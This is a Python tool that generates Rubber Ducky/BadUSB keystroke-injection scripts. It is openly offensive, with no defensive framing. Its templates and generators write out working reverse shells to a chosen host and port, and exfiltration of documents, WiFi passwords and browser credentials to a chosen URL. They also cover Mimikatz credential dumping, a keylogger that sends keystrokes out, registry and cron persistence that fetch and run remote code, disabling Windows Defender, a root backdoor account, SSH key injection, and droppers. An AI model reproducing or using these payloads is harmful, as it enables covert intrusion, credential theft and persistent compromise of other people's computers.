#!/usr/bin/env python3
import os
import time
import sys
import base64
import random
import string
from datetime import datetime

class BadUSBInjector:
    def __init__(self):
        self.payloads = {
            'windows_reverse_shell': {
                'name': 'Windows Reverse Shell (PowerShell)',
                'template': '''REM Windows Reverse Shell
DELAY 1000
GUI r
DELAY 500
STRING cmd /c powershell -WindowStyle Hidden -Command "$client=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
ENTER''',
                'vars': ['LHOST', 'LPORT']
            },
            'windows_admin_shell': {
                'name': 'Windows Admin Shell Prompt',
                'template': '''REM Elevated Command Prompt
GUI r
DELAY 300
STRING cmd
DELAY 200
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 500
ENTER''',
                'vars': []
            },
            'windows_exfiltrate': {
                'name': 'Windows Data Exfiltration',
                'template': '''REM Exfiltrate data via HTTP
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$data=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((ls C:\\Users\\$env:USERNAME\\Documents|Out-String)));Invoke-WebRequest -Uri {{EXFIL_URL}} -Method POST -Body $data"
ENTER''',
                'vars': ['EXFIL_URL']
            },
            'windows_persistence': {
                'name': 'Windows Registry Persistence',
                'template': '''REM Add persistence via registry
DELAY 1000
GUI r
DELAY 500
STRING cmd /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {{NAME}} /t REG_SZ /d "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('{{PAYLOAD_URL}}')" /f
ENTER''',
                'vars': ['NAME', 'PAYLOAD_URL']
            },
            'windows_wifi_grab': {
                'name': 'Windows WiFi Password Stealer',
                'template': '''REM Extract saved WiFi passwords
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$profiles=(netsh wlan show profiles|Select-String 'All User Profile'|%{($_ -split ':')[1].Trim()});$output=@();foreach($p in $profiles){$key=(netsh wlan show profile name=$p key=clear|Select-String 'Key Content'|%{($_ -split ':')[1].Trim()});$output+=\"$p : $key\"};$data=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(($output|Out-String)));Invoke-WebRequest -Uri {{EXFIL_URL}} -Method POST -Body $data"
ENTER''',
                'vars': ['EXFIL_URL']
            },
            'windows_disable_defender': {
                'name': 'Windows Disable Defender',
                'template': '''REM Disable Windows Defender
GUI r
DELAY 500
STRING powershell -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableBehaviorMonitoring $true;Set-MpPreference -DisableBlockAtFirstSeen $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisablePrivacyMode $true;Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true;Set-MpPreference -DisableScanningNetworkFiles $true;Set-MpPreference -DisableScriptScanning $true"
ENTER''',
                'vars': []
            },
            'linux_reverse_shell': {
                'name': 'Linux Reverse Shell (Bash)',
                'template': '''REM Linux Bash Reverse Shell
DELAY 1000
CTRL-ALT t
DELAY 500
STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &
ENTER
DELAY 100
STRING exit
ENTER''',
                'vars': ['LHOST', 'LPORT']
            },
            'linux_root_backdoor': {
                'name': 'Linux Root Backdoor User',
                'template': '''REM Create root backdoor user
DELAY 1000
CTRL-ALT t
DELAY 500
STRING sudo useradd -ou 0 -g 0 {{USERNAME}}
ENTER
DELAY 500
STRING {{PASSWORD}}
ENTER
DELAY 200
STRING sudo echo "{{USERNAME}} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
ENTER
DELAY 200
STRING exit
ENTER''',
                'vars': ['USERNAME', 'PASSWORD']
            },
            'linux_ssh_keys': {
                'name': 'Linux SSH Key Injection',
                'template': '''REM Inject SSH authorized key
DELAY 1000
CTRL-ALT t
DELAY 500
STRING mkdir -p ~/.ssh; echo "{{SSH_KEY}}" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys
ENTER
DELAY 200
STRING exit
ENTER''',
                'vars': ['SSH_KEY']
            },
            'macos_reverse_shell': {
                'name': 'macOS Reverse Shell',
                'template': '''REM macOS Terminal Reverse Shell
DELAY 1000
COMMAND SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1 &
ENTER
DELAY 100
COMMAND q
ENTER''',
                'vars': ['LHOST', 'LPORT']
            },
            'macos_download_exec': {
                'name': 'macOS Download and Execute',
                'template': '''REM Download and execute payload
DELAY 1000
COMMAND SPACE
DELAY 500
STRING terminal
DELAY 500
ENTER
DELAY 1000
STRING curl -s {{PAYLOAD_URL}} | bash &
ENTER
DELAY 100
COMMAND q
ENTER''',
                'vars': ['PAYLOAD_URL']
            },
            'android_usb_debug': {
                'name': 'Android USB Debugging Enable',
                'template': '''REM Enable USB debugging
DELAY 2000
HOME
DELAY 500
SWIPE 200 1000 200 200
DELAY 500
STRING Settings
DELAY 500
ENTER
DELAY 1000
STRING About phone
DELAY 500
ENTER
DELAY 500
DOWNARROW
DOWNARROW
DOWNARROW
ENTER
ENTER
ENTER
ENTER
ENTER
ENTER
ENTER
DELAY 1000
BACK
STRING Developer options
ENTER
DELAY 500
DOWNARROW
ENTER''',
                'vars': []
            }
        }
        
        self.advanced_payloads = {
            'windows_stealth_meterpreter': self.generate_meterpreter_payload,
            'windows_mimikatz': self.generate_mimikatz_payload,
            'windows_keylogger': self.generate_keylogger_payload,
            'linux_cron_backdoor': self.generate_cron_backdoor,
            'multi_credential_dump': self.generate_credential_dump
        }
    
    def generate_meterpreter_payload(self, lhost, lport):
        ps_payload = f'''$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{{SHELLCODE}}"));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()'''
        
        ducky_script = f'''REM Meterpreter Reverse HTTPS
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -enc {base64.b64encode(ps_payload.encode('utf-16le')).decode()}
ENTER'''
        
        return ducky_script
    
    def generate_mimikatz_payload(self, exfil_url):
        ducky_script = f'''REM Mimikatz Credential Dumper
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('{exfil_url}/mimikatz.ps1');Invoke-Mimikatz -DumpCreds|Out-File $env:TEMP\\creds.txt;$data=[Convert]::ToBase64String([IO.File]::ReadAllBytes($env:TEMP\\creds.txt));Invoke-WebRequest -Uri {exfil_url} -Method POST -Body $data;Remove-Item $env:TEMP\\creds.txt"
ENTER'''
        
        return ducky_script
    
    def generate_keylogger_payload(self, exfil_url):
        ducky_script = f'''REM PowerShell Keylogger
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$code={{Add-Type -Name W -M '[DllImport(\\"user32.dll\\")]public static extern short GetAsyncKeyState(int key);'}};$log='';while($true){{for($i=8;$i-le255;$i++){{if([W]::GetAsyncKeyState($i)-eq-32767){{$log+=[char]$i}}}};if($log.Length-gt100){{Invoke-WebRequest -Uri {exfil_url} -Method POST -Body $log;$log=''}};Start-Sleep -m 10}}"
ENTER'''
        
        return ducky_script
    
    def generate_cron_backdoor(self, payload_url):
        ducky_script = f'''REM Linux Cron Backdoor
DELAY 1000
CTRL-ALT t
DELAY 500
STRING (crontab -l 2>/dev/null; echo "*/5 * * * * curl -s {payload_url} | bash") | crontab -
ENTER
DELAY 200
STRING exit
ENTER'''
        
        return ducky_script
    
    def generate_credential_dump(self, exfil_url):
        ducky_script = f'''REM Multi-Source Credential Dump
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$creds=@{{}};$creds['Chrome']=(Get-Content $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data -Raw);$creds['Firefox']=(Get-ChildItem $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default\\logins.json -Recurse|Get-Content -Raw);$creds['WiFi']=(netsh wlan show profiles|Select-String 'All User Profile'|%{{netsh wlan show profile name=(($_ -split ':')[1].Trim()) key=clear}});$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($creds|ConvertTo-Json)));Invoke-WebRequest -Uri {exfil_url} -Method POST -Body $data"
ENTER'''
        
        return ducky_script
    
    def customize_payload(self, payload_name):
        if payload_name in self.payloads:
            payload = self.payloads[payload_name]
            script = payload['template']
            
            print(f"\n\033[97m[*] Customizing: {payload['name']}\033[0m\n")
            
            vars_dict = {}
            for var in payload['vars']:
                value = input(f"\033[95m[?] {var}: \033[0m").strip()
                vars_dict[var] = value
            
            for var, value in vars_dict.items():
                script = script.replace('{{' + var + '}}', value)
            
            return script
        
        return None
    
    def save_payload(self, script, filename):
        try:
            with open(filename, 'w') as f:
                f.write(script)
            
            print(f"\n\033[92m[+] Payload saved: {filename}\033[0m")
            return True
        
        except Exception as e:
            print(f"\033[91m[!] Save failed: {e}\033[0m")
            return False
    
    def encode_payload(self, script):
        encodings = {
            'base64': lambda s: base64.b64encode(s.encode()).decode(),
            'hex': lambda s: s.encode().hex(),
            'reverse': lambda s: s[::-1]
        }
        
        print(f"\n\033[97mEncoding options:\033[0m")
        for i, encoding in enumerate(encodings.keys(), 1):
            print(f"\033[97m  [{i}] {encoding.upper()}\033[0m")
        
        choice = input(f"\n\033[95m[?] Select encoding: \033[0m").strip()
        
        if choice.isdigit():
            encoding_name = list(encodings.keys())[int(choice) - 1]
            encoded = encodings[encoding_name](script)
            
            print(f"\n\033[92m[+] Encoded with {encoding_name}:\033[0m")
            print(f"\033[93m{encoded}\033[0m")
            
            return encoded
        
        return script
    
    def generate_dropper(self, payload_url):
        dropper_template = f'''@echo off
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('{payload_url}')"
exit'''
        
        return dropper_template
    
    def create_multi_stage(self, stage1_url, stage2_url):
        multi_stage = f'''REM Multi-Stage Attack
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "$s1=(New-Object Net.WebClient).DownloadString('{stage1_url}');IEX $s1;if($?){{$s2=(New-Object Net.WebClient).DownloadString('{stage2_url}');IEX $s2}}"
ENTER'''
        
        return multi_stage
    
    def obfuscate_script(self, script):
        lines = script.split('\n')
        obfuscated = []
        
        for line in lines:
            if line.startswith('STRING'):
                cmd = line.replace('STRING ', '')
                parts = cmd.split(' ')
                
                new_line = 'STRING ' + ' '.join(parts)
                obfuscated.append(new_line)
            else:
                obfuscated.append(line)
        
        return '\n'.join(obfuscated)
    
    def display_payloads(self):
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[92m[*] AVAILABLE PAYLOADS\033[0m")
        print(f"\033[92m{'='*70}\033[0m\n")
        
        categories = {
            'Windows': ['windows_reverse_shell', 'windows_admin_shell', 'windows_exfiltrate', 
                       'windows_persistence', 'windows_wifi_grab', 'windows_disable_defender'],
            'Linux': ['linux_reverse_shell', 'linux_root_backdoor', 'linux_ssh_keys'],
            'macOS': ['macos_reverse_shell', 'macos_download_exec'],
            'Android': ['android_usb_debug']
        }
        
        for category, payloads in categories.items():
            print(f"\033[93m{category}\033[0m")
            for payload in payloads:
                if payload in self.payloads:
                    print(f"\033[97m  - {payload}: {self.payloads[payload]['name']}\033[0m")
            print()

def run():
    print("\033[92m" + "="*70)
    print("     BAD USB COMMAND INJECTOR / RUBBER DUCKY EMULATOR")
    print("="*70 + "\033[0m\n")
    
    injector = BadUSBInjector()
    
    print("\033[97mOperation mode:\033[0m")
    print("  [1] Generate payload from template")
    print("  [2] View all payloads")
    print("  [3] Create custom payload")
    print("  [4] Generate advanced payload")
    print("  [5] Obfuscate payload")
    
    mode = input("\n\033[95m[?] Select: \033[0m").strip()
    
    if mode == '1':
        injector.display_payloads()
        
        payload_name = input("\n\033[95m[?] Payload name: \033[0m").strip()
        
        script = injector.customize_payload(payload_name)
        
        if script:
            print(f"\n\033[92m[+] Generated DuckyScript:\033[0m\n")
            print("\033[93m" + script + "\033[0m")
            
            save = input("\n\033[95m[?] Save to file? (y/n): \033[0m").strip().lower()
            if save == 'y':
                filename = input("\033[95m[?] Filename (payload.txt): \033[0m").strip()
                injector.save_payload(script, filename if filename else 'payload.txt')
    
    elif mode == '2':
        injector.display_payloads()
    
    elif mode == '3':
        print(f"\n\033[97m[*] DuckyScript Custom Payload Builder\033[0m")
        print(f"\033[97m[*] Enter commands (empty line to finish):\033[0m\n")
        
        lines = []
        while True:
            line = input("\033[95m> \033[0m")
            if not line:
                break
            lines.append(line)
        
        script = '\n'.join(lines)
        
        print(f"\n\033[92m[+] Custom payload created\033[0m")
        
        save = input("\n\033[95m[?] Save to file? (y/n): \033[0m").strip().lower()
        if save == 'y':
            filename = input("\033[95m[?] Filename (custom_payload.txt): \033[0m").strip()
            injector.save_payload(script, filename if filename else 'custom_payload.txt')
    
    elif mode == '4':
        print(f"\n\033[97mAdvanced Payloads:\033[0m")
        advanced = list(injector.advanced_payloads.keys())
        for i, name in enumerate(advanced, 1):
            print(f"\033[97m  [{i}] {name}\033[0m")
        
        choice = input(f"\n\033[95m[?] Select: \033[0m").strip()
        
        if choice.isdigit() and 1 <= int(choice) <= len(advanced):
            payload_name = advanced[int(choice) - 1]
            
            if 'meterpreter' in payload_name:
                lhost = input("\033[95m[?] LHOST: \033[0m").strip()
                lport = input("\033[95m[?] LPORT: \033[0m").strip()
                script = injector.advanced_payloads[payload_name](lhost, lport)
            
            elif 'cron' in payload_name:
                url = input("\033[95m[?] Payload URL: \033[0m").strip()
                script = injector.advanced_payloads[payload_name](url)
            
            else:
                url = input("\033[95m[?] Exfiltration URL: \033[0m").strip()
                script = injector.advanced_payloads[payload_name](url)
            
            print(f"\n\033[92m[+] Generated:\033[0m\n")
            print("\033[93m" + script + "\033[0m")
            
            save = input("\n\033[95m[?] Save to file? (y/n): \033[0m").strip().lower()
            if save == 'y':
                filename = input("\033[95m[?] Filename (advanced_payload.txt): \033[0m").strip()
                injector.save_payload(script, filename if filename else 'advanced_payload.txt')
    
    elif mode == '5':
        filename = input("\033[95m[?] Payload file to obfuscate: \033[0m").strip()
        
        try:
            with open(filename, 'r') as f:
                script = f.read()
            
            obfuscated = injector.obfuscate_script(script)
            
            print(f"\n\033[92m[+] Obfuscated:\033[0m\n")
            print("\033[93m" + obfuscated + "\033[0m")
            
            save = input("\n\033[95m[?] Save obfuscated payload? (y/n): \033[0m").strip().lower()
            if save == 'y':
                out_filename = input("\033[95m[?] Filename (obfuscated_payload.txt): \033[0m").strip()
                injector.save_payload(obfuscated, out_filename if out_filename else 'obfuscated_payload.txt')
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
